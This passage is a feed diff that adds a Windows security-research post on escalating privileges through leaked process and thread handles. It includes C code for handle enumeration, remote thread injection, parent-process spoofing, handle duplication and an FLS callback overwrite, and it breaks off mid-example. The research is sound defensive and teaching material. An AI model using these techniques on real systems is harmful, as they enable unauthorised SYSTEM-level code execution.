@@ -4,7 +4,7 @@
   <title><![CDATA[]]></title>
   <link href="http://hatRiot.github.io/atom.xml" rel="self"/>
   <link href="http://hatRiot.github.io/"/>
-  <updated>2018-05-18T09:39:16-07:00</updated>
+  <updated>2019-08-22T10:30:15-07:00</updated>
   <id>http://hatRiot.github.io/</id>
   <author>
     <name><![CDATA[Bryan Alexander]]></name>
@@ -12,6 +12,1721 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[Exploiting Leaked Process and Thread Handles]]></title>
+    <link href="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/"/>
+    <updated>2019-08-22T14:10:04-07:00</updated>
+    <id>http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles</id>
+    <content type="html"><![CDATA[<p>Over the years I&rsquo;ve seen and exploited the occasional leaked handle bug. These can be
+particularly fun to toy with, as the handles aren&rsquo;t always granted
+<code>PROCESS_ALL_ACCESS</code> or <code>THREAD_ALL_ACCESS</code>, requiring a bit more ingenuity.
+This post will address the various access rights assignable to handles and what we
+can do to exploit them to gain elevated code execution. I&rsquo;ve chosen to focus
+specifically on process and thread handles as this seems to be the most common,
+but surely other objects can be exploited in similar manner.</p>
+
+<p>As background, while this bug can occur under various circumstances, I&rsquo;ve most
+commonly seen it manifest when some privileged process opens a handle with
+<code>bInheritHandle</code> set to true. Once this happens, any child process of this
+privileged process inherits the handle and all access it grants. As example,
+assume a SYSTEM level process does this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Since it&rsquo;s allowing the opened handle to be inherited, any child process
+will gain access to it. If they execute userland code impersonating the desktop
+user, as a service might often do, those userland processes will have access to
+that handle.</p>
+
+<h2>Existing bugs</h2>
+
+<p>There are several public bugs we can point to over the years as example and
+inspiration. As per usual James Forshaw has a fun one from 2016[0] in which
+he&rsquo;s able to leak a privileged thread handle out of the secondary logon
+service with <code>THREAD_ALL_ACCESS</code>. This is the most &ldquo;open&rdquo; of permissions, but
+he exploited it in a novel way that I was unaware of, at the time.</p>
+
+<p>Another one from Ivan Fratric exploited[1] a leaked process handle with
+<code>PROCESS_DUP_HANDLE</code>, which even Microsoft knew was bad. In his <code>Bypassing
+Mitigations by Attacking JIT Server in Microsoft Edge</code> whitepaper, he
+identifies the JIT server process mapping memory into the content process. To
+do this, the JIT process needs a handle to it. The content process calls
+<code>DuplicateHandle</code> on itself with the <code>PROCESS_DUP_HANDLE</code>, which can be
+exploited to obtain a full access handle.</p>
+
+<p>A more recent example is a Dell LPE [2] in which a <code>THREAD_ALL_ACCESS</code> handle
+was obtained from a privileged process. They were able to exploit this via a
+dropped DLL and an APC.</p>
+
+<h2>Setup</h2>
+
+<p>In this post, I wanted to examine all possible access rights to determine which
+were exploitable on there own and which were not. Of those that were not, I
+tried to determine what concoction of privileges were necessary to make it so.
+I&rsquo;ve tried to stay &ldquo;realistic&rdquo; here in my experience, but you never know what
+you&rsquo;ll find in the wild, and this post reflects that.</p>
+
+<p>For testing, I created a simple client and server: a privileged server that
+leaks a handle, and a client capable of consuming it. Here&rsquo;s the server:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#include "pch.h"
+</span><span class='line'>#include &lt;iostream&gt;
+</span><span class='line'>#include &lt;Windows.h&gt;
+</span><span class='line'>
+</span><span class='line'>int main(int argc, char **argv)
+</span><span class='line'>{
+</span><span class='line'>    if (argc &lt;= 1) {
+</span><span class='line'>        printf("[-] Please give me a target PID\n");
+</span><span class='line'>        return -1;
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    HANDLE hUserToken, hUserProcess;
+</span><span class='line'>    HANDLE hProcess, hThread;
+</span><span class='line'>    STARTUPINFOA si;
+</span><span class='line'>    PROCESS_INFORMATION pi;
+</span><span class='line'>
+</span><span class='line'>    ZeroMemory(&si, sizeof(si));
+</span><span class='line'>    si.cb = sizeof(si);
+</span><span class='line'>    ZeroMemory(&pi, sizeof(pi));
+</span><span class='line'>
+</span><span class='line'>    hUserProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, atoi(argv[1]));
+</span><span class='line'>    if (!OpenProcessToken(hUserProcess, TOKEN_ALL_ACCESS, &hUserToken)) {
+</span><span class='line'>        printf("[-] Failed to open user process: %d\n", GetLastError());
+</span><span class='line'>        CloseHandle(hUserProcess);
+</span><span class='line'>        return -1;
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, GetCurrentProcessId());
+</span><span class='line'>    printf("[+] Process: %x\n", hProcess);
+</span><span class='line'>
+</span><span class='line'>    CreateProcessAsUserA(hUserToken, 
+</span><span class='line'>        "VulnServiceClient.exe", 
+</span><span class='line'>        NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+</span><span class='line'>    SuspendThread(hThread);
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the above, I&rsquo;m grabbing a handle to the token we want to impersonate,
+opening an inheritable handle to the current process (which we&rsquo;re running as
+SYSTEM), then spawning a child process. This child process is simply my client
+application, which will go about attempting to exploit the handle.</p>
+
+<p>The client is, of course, a little more involved. The only component that needs
+a little discussion up front is fetching the leaked handle. This can be done
+via <code>NtQuerySystemInformation</code> and does not require any special privileges:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void ProcessHandles()
+</span><span class='line'>{
+</span><span class='line'>    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+</span><span class='line'>    _NtQuerySystemInformation NtQuerySystemInformation =
+</span><span class='line'>        (_NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
+</span><span class='line'>    _NtDuplicateObject NtDuplicateObject =
+</span><span class='line'>        (_NtDuplicateObject)GetProcAddress(hNtdll, "NtDuplicateObject");
+</span><span class='line'>    _NtQueryObject NtQueryObject =
+</span><span class='line'>        (_NtQueryObject)GetProcAddress(hNtdll, "NtQueryObject");
+</span><span class='line'>    _RtlEqualUnicodeString RtlEqualUnicodeString =
+</span><span class='line'>        (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");
+</span><span class='line'>    _RtlInitUnicodeString RtlInitUnicodeString = 
+</span><span class='line'>        (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
+</span><span class='line'>
+</span><span class='line'>    ULONG handleInfoSize = 0x10000;
+</span><span class='line'>    NTSTATUS status;
+</span><span class='line'>    PSYSTEM_HANDLE_INFORMATION phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);
+</span><span class='line'>    DWORD dwPid = GetCurrentProcessId();
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>    printf("[+] Looking for process handles...\n");
+</span><span class='line'>
+</span><span class='line'>    while ((status = NtQuerySystemInformation(
+</span><span class='line'>        SystemHandleInformation,
+</span><span class='line'>        phHandleInfo,
+</span><span class='line'>        handleInfoSize,
+</span><span class='line'>        NULL
+</span><span class='line'>    )) == STATUS_INFO_LENGTH_MISMATCH)
+</span><span class='line'>        phHandleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(phHandleInfo, handleInfoSize *= 2);
+</span><span class='line'>
+</span><span class='line'>    if (status != STATUS_SUCCESS)
+</span><span class='line'>    {
+</span><span class='line'>        printf("NtQuerySystemInformation failed!\n");
+</span><span class='line'>        return;
+</span><span class='line'>    }
+</span><span class='line'>
+</span><span class='line'>    printf("[+] Fetched %d handles\n", phHandleInfo-&gt;HandleCount);
+</span><span class='line'>
+</span><span class='line'>    // iterate handles until we find the privileged process
+</span><span class='line'>    for (int i = 0; i &lt; phHandleInfo-&gt;HandleCount; ++i)
+</span><span class='line'>    {
+</span><span class='line'>        SYSTEM_HANDLE handle = phHandleInfo-&gt;Handles[i];
+</span><span class='line'>        POBJECT_TYPE_INFORMATION objectTypeInfo;
+</span><span class='line'>        PVOID objectNameInfo;
+</span><span class='line'>        UNICODE_STRING objectName;
+</span><span class='line'>        ULONG returnLength;
+</span><span class='line'>
+</span><span class='line'>        // Check if this handle belongs to the PID the user specified
+</span><span class='line'>        if (handle.ProcessId != dwPid)
+</span><span class='line'>            continue;
+</span><span class='line'>
+</span><span class='line'>        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
+</span><span class='line'>        if (NtQueryObject(
+</span><span class='line'>            (HANDLE)handle.Handle,
+</span><span class='line'>            ObjectTypeInformation,
+</span><span class='line'>            objectTypeInfo,
+</span><span class='line'>            0x1000,
+</span><span class='line'>            NULL
+</span><span class='line'>        ) != STATUS_SUCCESS)
+</span><span class='line'>            continue;
+</span><span class='line'>
+</span><span class='line'>        if (handle.GrantedAccess == 0x0012019f)
+</span><span class='line'>        {
+</span><span class='line'>            free(objectTypeInfo);
+</span><span class='line'>            continue;
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        objectNameInfo = malloc(0x1000);
+</span><span class='line'>        if (NtQueryObject(
+</span><span class='line'>            (HANDLE)handle.Handle,
+</span><span class='line'>            ObjectNameInformation,
+</span><span class='line'>            objectNameInfo,
+</span><span class='line'>            0x1000,
+</span><span class='line'>            &returnLength
+</span><span class='line'>        ) != STATUS_SUCCESS)
+</span><span class='line'>        {
+</span><span class='line'>            objectNameInfo = realloc(objectNameInfo, returnLength);
+</span><span class='line'>            if (NtQueryObject(
+</span><span class='line'>                (HANDLE)handle.Handle,
+</span><span class='line'>                ObjectNameInformation,
+</span><span class='line'>                objectNameInfo,
+</span><span class='line'>                returnLength,
+</span><span class='line'>                NULL
+</span><span class='line'>            ) != STATUS_SUCCESS)
+</span><span class='line'>            {
+</span><span class='line'>                free(objectTypeInfo);
+</span><span class='line'>                free(objectNameInfo);
+</span><span class='line'>                continue;
+</span><span class='line'>            }
+</span><span class='line'>        }
+</span><span class='line'>
+</span><span class='line'>        // check if we've got a process object; there should only be one, but should we 
+</span><span class='line'>        // have multiple, this is where we'd perform the checks
+</span><span class='line'>        objectName = *(PUNICODE_STRING)objectNameInfo;
+</span><span class='line'>        UNICODE_STRING pProcess, pThread;
+</span><span class='line'>
+</span><span class='line'>        RtlInitUnicodeString(&pThread, L"Thread");
+</span><span class='line'>        RtlInitUnicodeString(&pProcess, L"Process");
+</span><span class='line'>        if (RtlEqualUnicodeString(&objectTypeInfo-&gt;Name, &pProcess, TRUE) && TARGET == 0) {
+</span><span class='line'>            printf("[+] Found process handle (%x)\n", handle.Handle);
+</span><span class='line'>            HANDLE hProcess = (HANDLE)handle.Handle;
+</span><span class='line'>        }
+</span><span class='line'>        else if (RtlEqualUnicodeString(&objectTypeInfo-&gt;Name, &pThread, TRUE) && TARGET == 1) {
+</span><span class='line'>            printf("[+] Found thread handle (%x)\n", handle.Handle);
+</span><span class='line'>            HANDLE hThread = (HANDLE)handle.Handle;
+</span><span class='line'>        else
+</span><span class='line'>            continue;
+</span><span class='line'>        
+</span><span class='line'>        free(objectTypeInfo);
+</span><span class='line'>        free(objectNameInfo);
+</span><span class='line'>    }
+</span><span class='line'>} </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;re essentially just fetching all system handles, filtering down to ones
+belonging to our process, then hunting for a thread or a process. In a more
+active client process with many threads or process handles we&rsquo;d need to filter
+down further, but this is sufficient for testing.</p>
+
+<p>The remainder of this post will be broken down into process and thread security
+access rights.</p>
+
+<h2>Process</h2>
+
+<p>There are approximately 14 process-specific rights[3]. We&rsquo;re going to ignore
+the standard object access rights for now (DELETE, READ_CONTROL, etc.) as they
+apply more to the handle itself than what it allows one to do.</p>
+
+<p>Right off the bat, we&rsquo;re going to dismiss the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_QUERY_INFORMATION
+</span><span class='line'>PROCESS_QUERY_LIMITED_INFORMATION
+</span><span class='line'>PROCESS_SUSPEND_RESUME
+</span><span class='line'>PROCESS_TERMINATE
+</span><span class='line'>PROCESS_SET_QUOTA
+</span><span class='line'>PROCESS_VM_OPERATION
+</span><span class='line'>PROCESS_VM_READ
+</span><span class='line'>SYNCHRONIZE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To be clear I&rsquo;m only suggesting that the above access rights cannot be
+exploited on their own; they are, of course, very useful when roped in with
+others. There may be weird edge cases in which one of these might be useful
+(PROCESS_TERMINATE, for example), but barring any magic, I don&rsquo;t see how.</p>
+
+<p>That leaves the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_ALL_ACCESS
+</span><span class='line'>PROCESS_CREATE_PROCESS
+</span><span class='line'>PROCESS_CREATE_THREAD
+</span><span class='line'>PROCESS_DUP_HANDLE
+</span><span class='line'>PROCESS_SET_INFORMATION
+</span><span class='line'>PROCESS_VM_WRITE</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;ll run through each of these individually.</p>
+
+<h3>PROCESS_ALL_ACCESS</h3>
+
+<p>The most obvious of them all, this one grants us access to it all. We can
+simply allocate memory and create a thread to obtain code execution:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>char payload[] = "\xcc\xcc";
+</span><span class='line'>LPVOID lpBuf = VirtualAllocEx(hProcess, NULL, 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span><span class='line'>WriteProcessMemory(hProcess, lpBuf, payload, 2, NULL);
+</span><span class='line'>CreateRemoteThread(hProcess, NULL, 0, lpBuf, 0, 0, NULL);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Nothing to it.</p>
+
+<h3>PROCESS_CREATE_PROCESS</h3>
+
+<p>This right is &ldquo;required to create a process&rdquo;, which is to say that we can spawn
+child processes. To do this remotely, we just need to spawn a process and set
+its parent to the privileged process we&rsquo;ve got a handle to. This will create
+the new process and inherit its parent token which will hopefully be a SYSTEM
+token.</p>
+
+<p>Here&rsquo;s how we do that:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>STARTUPINFOEXA sinfo = { sizeof(sinfo) };
+</span><span class='line'>PROCESS_INFORMATION pinfo;
+</span><span class='line'>LPPROC_THREAD_ATTRIBUTE_LIST ptList = NULL;
+</span><span class='line'>SIZE_T bytes;
+</span><span class='line'>
+</span><span class='line'>sinfo.StartupInfo.cb = sizeof(STARTUPINFOEXA);
+</span><span class='line'>InitializeProcThreadAttributeList(NULL, 1, 0, &bytes);
+</span><span class='line'>ptList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(bytes);
+</span><span class='line'>InitializeProcThreadAttributeList(ptList, 1, 0, &bytes);
+</span><span class='line'>
+</span><span class='line'>UpdateProcThreadAttribute(ptList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hPrivProc, sizeof(HANDLE), NULL, NULL);
+</span><span class='line'>sinfo.lpAttributeList = ptList;
+</span><span class='line'>
+</span><span class='line'>CreateProcessA("cmd.exe", (LPSTR)"cmd.exe /c calc.exe", 
+</span><span class='line'>        NULL, NULL, TRUE, 
+</span><span class='line'>        EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, 
+</span><span class='line'>        &sinfo.StartupInfo, &pinfo);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We should now have calc running with the privileged token. Obviously we&rsquo;d want
+to replace that with something more useful!</p>
+
+<h3>PROCESS_CREATE_THREAD</h3>
+
+<p>Here we&rsquo;ve got the ability to use <code>CreateRemoteThread</code>, but can&rsquo;t control any
+memory in the target process. There are of course ways we can influence memory
+without direct write access, such as WNF, but we&rsquo;d still have no way of
+resolving those addresses. As it turns out, however, we don&rsquo;t need the control.
+<code>CreateRemoteThread</code> can be pointed at a function with a single argument, which
+gives us quite a bit of control. <code>LoadLibraryA</code> and <code>WinExec</code> are both great
+candidates for executing child processes or loading arbitrary code.</p>
+
+<p>As example, there&rsquo;s an ANSI <code>cmd.exe</code> located in msvcrt.dll at offset 0x503b8.
+We can pass this as an argument to <code>CreateRemoteThread</code> and trigger a <code>WinExec</code>
+call to pop a shell:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>DWORD dwCmd = (GetModuleBaseAddress(GetCurrentProcessId(), L"msvcrt.dll") + 0x503b8);
+</span><span class='line'>HANDLE hThread = CreateRemoteThread(hPrivProc, NULL, 0,
+</span><span class='line'>                        (LPTHREAD_START_ROUTINE)WinExec, 
+</span><span class='line'>                        (LPVOID)dwCmd, 
+</span><span class='line'>                        0, NULL);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can do something similar for <code>LoadLibraryA</code>. This of course is predicated on
+the system path containing a writable directory for our user.</p>
+
+<h3>PROCESS_DUP_HANDLE</h3>
+
+<p>Microsoft&rsquo;s own documentation on process security and access rights points to
+this specifically as a sensitive right. Using it, we can simply duplicate our
+process handle with <code>PROCESS_ALL_ACCESS</code>, allowing us full RW to its address
+space. As per Ivan Fratric&rsquo;s JIT bug, it&rsquo;s as simple as this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HANDLE hDup = INVALID_HANDLE_VALUE;
+</span><span class='line'>DuplicateHandle(hPrivProc, GetCurrentProcess(), GetCurrentProcess(), &hDup, PROCESS_ALL_ACCESS, 0, 0)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we can simply follow the WriteProcessMemory/CreateRemoteThread strategy for
+executing arbitrary code.</p>
+
+<h3>PROCESS_SET_INFORMATION</h3>
+
+<p>Granting this permission allows one to execute <code>SetInformationProcess</code> in
+addition to several fields in <code>NtSetInformationProcess</code>. The latter is far more
+powerful, but many of the <code>PROCESSINFOCLASS</code> fields available are either read
+only or require additional privileges to actually set (<code>SeDebugPrivilege</code> for
+<code>ProcessExceptionPort</code> and <code>ProcessInstrumentationCallback</code>(win7) for
+example). Process Hacker[15] maintains an up to date definition of this class
+and its members.</p>
+
+<p>Of the available flags, none were particularly interesting on their own. I
+needed to add <code>PROCESS_VM_*</code> privileges in order to make any usable and at
+that point we defeat the purpose.</p>
+
+<h3>PROCESS_VM_*</h3>
+
+<p>This covers the three flavors of VM access: WRITE/READ/OPERATION. The first two
+should be self-explanatory and the third allows one to operate on the virtual
+address space itself, such as changing page protections (VirtualProtectEx) or
+allocating memory (VirtualAllocEx). I won&rsquo;t address each permutation of these
+three, but I think it&rsquo;s reasonable to assume that <code>PROCESS_VM_WRITE</code> is a
+necessary requirement. While <code>PROCESS_VM_OPERATION</code> allows us to crash the
+remote process which could open up other flaws, it&rsquo;s not a generic nor elegant
+approach. Ditto with <code>PROCESS_VM_READ</code>.</p>
+
+<p><code>PROCESS_VM_WRITE</code> proved to be a challenge on its own, and I was unable to
+come up with a generic solution. At first blush, the entire set of
+Shatter-like injection strategies documented by Hexacorn[12] seem like
+they&rsquo;d be perfect. They simply require the remote process to use windows,
+clipboard registrations, etc. None of these are guaranteed, but chances are one
+is bound to exist. Unfortunately for us, many of them restrict access across
+sessions or scaling integrity levels. We can write into the remote process,
+but we need some way to gain control over execution flow.</p>
+
+<p>In addition to being unable to modify page permissions, we cannot read nor
+map/allocate memory. There are plenty of ways we can leak memory from the
+remote process without directly interfacing with it, however.</p>
+
+<p>Using <code>NtQuerySystemInformation</code>, for example, we can enumerate all threads
+inside a remote process regardless of its IL. This grants us a list of
+<code>SYSTEM_EXTENDED_THREAD_INFORMATION</code> objects which contain, among other
+things, the address of the TEB. <code>NtQueryInformationProcess</code> allows us to fetch
+the remote process PEB address. This latter API requires the
+<code>PROCESS_QUERY_INFORMATION</code> right, however, which ended up throwing a major
+wrench in my plan. Because of this I&rsquo;m appending <code>PROCESS_QUERY_INFORMATION</code>
+onto <code>PROCESS_VM_WRITE</code> which gives us the necessary components to pull this
+off. If someone knows of a way to leak the address of a remote process PEB
+without it, I&rsquo;d love to hear.</p>
+
+<p>The approach I took was a bit loopy, but it ended up working reliably and
+generically. If you&rsquo;ve read my previous post on fiber local storage (FLS)[13],
+this is the research I was referring to. If you haven&rsquo;t, I recommend giving it
+a brief read, but I&rsquo;ll regurgitate a bit of it here.</p>
+
+<p>Briefly, we can abuse fibers and FLS to overwrite callbacks which are executed
+&ldquo;&hellip;on fiber deletion, thread exit, and when an FLS index is freed&rdquo;. The
+primary thread of a process will always setup a fiber, thus there will always
+be a callback for us to overwrite (msvcrt!_freefls). Callbacks are stored in
+the PEB (FlsCallback) and the fiber local storage in the TEB (FlsData). By
+smashing the FlsCallback we can obtain control over execution flow when one of
+the fiber actions are taken.</p>
+
+<p>With only write access to the process, however, this becomes a bit convoluted.
+We cannot allocate memory and so we need some known location to put the
+payload. In addition, the FlsCallback and FlsData variables in PEB/TEB are
+pointers and we&rsquo;re unable to read these.</p>
+
+<p>Stashing the payload turned out to be pretty simple. Since we&rsquo;ve established
+we can leak PEB/TEB addresses we already have two powerful primitives. After
+looking over both structures, I found that thread local storage (TLS) happened
+to provide us with enough room to store ROP gadgets and a thin payload. TLS is
+embedded within the structure itself, so we can simply offset into the TEB
+address (which we have). If you&rsquo;re unfamiliar with TLS, Skywing&rsquo;s write-ups are
+fantastic and have aged well[14].</p>
+
+<p>Gaining control over the callback was a little trickier. A pointer to a
+<code>_FLS_CALLBACK_INFO</code> structure is stored in the PEB (FlsCallback) and is an
+opaque structure. Since we can&rsquo;t actually read this pointer, we have no simple
+way of overwriting the pointer. Or do we?</p>
+
+<p>What I ended up doing is overwriting the FlsCallback pointer itself in the PEB,
+essentially creating my own fake <code>_FLS_CALLBACK_INFO</code> structure in TLS. It&rsquo;s a
+pretty simple structure and really only has one value of importance: the
+callback pointer.</p>
+
+<p>In addition, as per the FLS article, we also need to take control over ECX/RCX.
+This will allow us to stack pivot and continue executing our ROP payload. This
+requires that we update the <code>TEB-&gt;FlsData</code> entry which we also are unable to
+do, since it&rsquo;s a pointer. Much like <code>FlsCallback</code>, though, I was able to just
+overwrite this value and craft my own data structure, which also turned out to
+be pretty simple. The TLS buffer ended up looking like this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>//
+</span><span class='line'>// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
+</span><span class='line'>// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
+</span><span class='line'>// 32 ] 41414141 41414141 41414141 41414141 
+</span><span class='line'>//</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There just so happens to be a perfect stack pivot gadget located in
+<code>kernelbase!SwitchToFiberContext</code> (or <code>kernel32!SwitchToFiber</code> on Windows 7):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
+</span><span class='line'>7603c41b c20400          ret     4</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Putting this all together, execution results in:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
